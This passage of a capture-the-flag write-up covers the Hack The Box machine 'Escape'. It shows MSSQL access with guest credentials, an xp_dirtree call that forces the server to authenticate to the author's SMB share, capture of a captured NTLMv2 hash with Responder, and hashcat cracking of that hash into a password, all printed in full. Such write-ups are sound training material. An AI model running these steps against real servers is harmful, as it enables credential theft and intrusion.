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" alt="cdb98d08e978582ab66f91a16448d6ea.png"/></p>
+<p>Since MSSQL is already open on port 1433, maybe I can attempt to connect to it. And it worked successfully:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.129.228.253              
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLMOCK): Line 1: Changed database context to &apos;master&apos;.
+[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (PublicUser  guest@master)&gt; 
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Escape]</span>
+&boxur;&boxh;$ impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@<span class="hljs-number">10.129</span>.<span class="hljs-number">228.253</span>              
+Impacket v0.<span class="hljs-number">14.0</span><span class="hljs-selector-class">.dev0</span> - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="hljs-selector-attr">[*]</span> Encryption required, switching to TLS
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">ENVCHANGE</span>(DATABASE): Old Value: master, New Value: master
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">ENVCHANGE</span>(LANGUAGE): Old Value: , New Value: us_english
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">ENVCHANGE</span>(PACKETSIZE): Old Value: <span class="hljs-number">4096</span>, New Value: <span class="hljs-number">16192</span>
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">INFO</span>(DC\SQLMOCK): Line <span class="hljs-number">1</span>: Changed database context to <span class="hljs-string">&apos;master&apos;</span>.
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">INFO</span>(DC\SQLMOCK): Line <span class="hljs-number">1</span>: Changed language setting to us_english.
+<span class="hljs-selector-attr">[*]</span> ACK: Result: <span class="hljs-number">1</span> - Microsoft SQL Server <span class="hljs-number">2019</span> RTM (<span class="hljs-number">15.0</span>.<span class="hljs-number">2000</span>)
+<span class="hljs-selector-attr">[!]</span> Press help <span class="hljs-keyword">for</span> extra shell commands
+SQL (PublicUser  guest@master)&gt; 
+</code></pre></div>
+<p>When checking what user the MSSQL instance is running as, I find it is <code class="inline-code">sql_svc</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">SQL (PublicUser  guest@master)&gt; xp_dirtree //10.10.15.82/share
+subdirectory   depth   file   
+------------   -----   ----   
+SQL (PublicUser  guest@master)&gt; 
+</pre><pre class="hljs"><code><span class="hljs-keyword">SQL</span> (PublicUser  guest<span class="hljs-variable">@master</span>)<span class="hljs-operator">&gt;</span> xp_dirtree <span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">10.10</span><span class="hljs-number">.15</span><span class="hljs-number">.82</span><span class="hljs-operator">/</span>share
+subdirectory   depth   file   
+<span class="hljs-comment">------------   -----   ----   </span>
+<span class="hljs-keyword">SQL</span> (PublicUser  guest<span class="hljs-variable">@master</span>)<span class="hljs-operator">&gt;</span> 
+</code></pre></div>
+<p>In my responder session, I captured the NTLMv2 hash of <code class="inline-code">sql_svc</code> account:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">[SMB] NTLMv2-SSP Client   : 10.129.228.253
+[SMB] NTLMv2-SSP Username : sequel\sql_svc
+[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:d21f8b41686306d3:56A6DC3E0B55FC3E2C48FF3291B741EA:010100000000000080B14D04B093DC018A4AF855A38899680000000002000800380038004700360001001E00570049004E002D00440042005400520058004A0055005A0043004600340004003400570049004E002D00440042005400520058004A0055005A004300460034002E0038003800470036002E004C004F00430041004C000300140038003800470036002E004C004F00430041004C000500140038003800470036002E004C004F00430041004C000700080080B14D04B093DC0106000400020000000800300030000000000000000000000000300000680672485AAB157D95D47B92778C1AECEEFE95BB129AFA5580086D6D2F5D6EB50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00380032000000000000000000</pre><pre class="hljs"><code>[SMB] NTLMv2-SSP Client   : <span class="hljs-number">10.129.228.253</span>
+[SMB] NTLMv2-SSP Username : sequel\sql_svc
+[SMB] NTLMv2-SSP Hash     : sql_sv<span class="hljs-number">c::</span>sequel:d21f8b<span class="hljs-number">41686306d3</span>:<span class="hljs-number">56</span>A6DC3E0B55FC3E2C48FF3291B741EA:<span class="hljs-number">010100000000000080</span>B14D04B093DC018A4AF855A38899680000000002000800380038004700360001001E00570049004E002D00440042005400520058004A0055005A0043004600340004003400570049004E002D00440042005400520058004A0055005A004300460034002E0038003800470036002E004C004F00430041004C000300140038003800470036002E004C004F00430041004C000500140038003800470036002E004C004F00430041004C000700080080B14D04B093DC0106000400020000000800300030000000000000000000000000300000680672485AAB157D95D47B92778C1AECEEFE95BB129AFA5580086D6D2F5D6EB50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E003800320000000<span class="hljs-number">00000000000</span></code></pre></div>
+<p>Cracking the hash leads to the password <code class="inline-code">REGGIE1234ronnie</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">SQL_SVC::sequel:a32b94a017fe98fe:232ed4917229c3d67fc1b7693bcb15f0:01010000000000008097364eb093dc01032169c61fcc80130000000002000800560053005900320001001e00570049004e002d003500530037004a00460039003300580056004500590004003400570049004e002d003500530037004a0046003900330058005600450059002e0056005300590032002e004c004f00430041004c000300140056005300590032002e004c004f00430041004c000500140056005300590032002e004c004f00430041004c00070008008097364eb093dc0106000400020000000800300030000000000000000000000000300000680672485aab157d95d47b92778c1aeceefe95bb129afa5580086d6d2f5d6eb50a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00380032000000000000000000:REGGIE1234ronnie
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: SQL_SVC::sequel:a32b94a017fe98fe:232ed4917229c3d67f...000000
+</pre><pre class="hljs"><code>SQL_SVC<span class="hljs-type">::sequel</span>:a32b94a017fe98fe:<span class="hljs-number">232</span>ed4917229c3d67fc1b7693bcb15f0:<span class="hljs-number">01010000000000008097364</span>eb093dc01032169c61fcc80130000000002000800560053005900320001001e00570049004e002d003500530037004a00460039003300580056004500590004003400570049004e002d003500530037004a0046003900330058005600450059002e0056005300590032002e004c004f00430041004c000300140056005300590032002e004c004f00430041004c000500140056005300590032002e004c004f00430041004c00070008008097364eb093dc0106000400020000000800300030000000000000000000000000300000680672485aab157d95d47b92778c1aeceefe95bb129afa5580086d6d2f5d6eb50a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00380032000000000000000000:REGGIE1234ronnie
+                                                          
+Session<span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.: hashcat
+Status<span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..: Cracked
+Hash.Mode<span class="hljs-params">...</span><span class="hljs-params">...</span>..: <span class="hljs-number">5600</span> (NetNTLMv2)
+Hash.Target<span class="hljs-params">...</span><span class="hljs-params">...</span>: SQL_SVC<span class="hljs-type">::sequel</span>:a32b94a017fe98fe:<span class="hljs-number">232</span>ed4917229c3d67f<span class="hljs-params">...</span><span class="hljs-number">000000</span>
+</code></pre></div>
+<p>Using the credentials of <code class="inline-code">sql_svc</code>, I gained access to the MSSQL again once more:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ impacket-mssqlclient sequel.htb/sql_svc:REGGIE1234ronnie@10.129.228.253 -windows-auth
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLMOCK): Line 1: Changed database context to &apos;master&apos;.
+[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (sequel\sql_svc  guest@master)&gt; 
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Escape]</span>
+&boxur;&boxh;$ impacket-mssqlclient sequel.htb/sql_svc:REGGIE1234ronnie@<span class="hljs-number">10.129</span>.<span class="hljs-number">228.253</span> -windows-auth
+Impacket v0.<span class="hljs-number">14.0</span><span class="hljs-selector-class">.dev0</span> - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="hljs-selector-attr">[*]</span> Encryption required, switching to TLS
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">ENVCHANGE</span>(DATABASE): Old Value: master, New Value: master
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">ENVCHANGE</span>(LANGUAGE): Old Value: , New Value: us_english
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">ENVCHANGE</span>(PACKETSIZE): Old Value: <span class="hljs-number">4096</span>, New Value: <span class="hljs-number">16192</span>
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">INFO</span>(DC\SQLMOCK): Line <span class="hljs-number">1</span>: Changed database context to <span class="hljs-string">&apos;master&apos;</span>.
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">INFO</span>(DC\SQLMOCK): Line <span class="hljs-number">1</span>: Changed language setting to us_english.
+<span class="hljs-selector-attr">[*]</span> ACK: Result: <span class="hljs-number">1</span> - Microsoft SQL Server <span class="hljs-number">2019</span> RTM (<span class="hljs-number">15.0</span>.<span class="hljs-number">2000</span>)
+<span class="hljs-selector-attr">[!]</span> Press help <span class="hljs-keyword">for</span> extra shell commands
+SQL (sequel\sql_svc  guest@master)&gt; 
+</code></pre></div>
+<p>However, I am not able to elevate my privileges.</p>
+<p>Since the <code class="inline-code">sql_svc</code> is a user on the machine, I decided to check for privileges. Then I noticed it has the ability to run WinRM:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
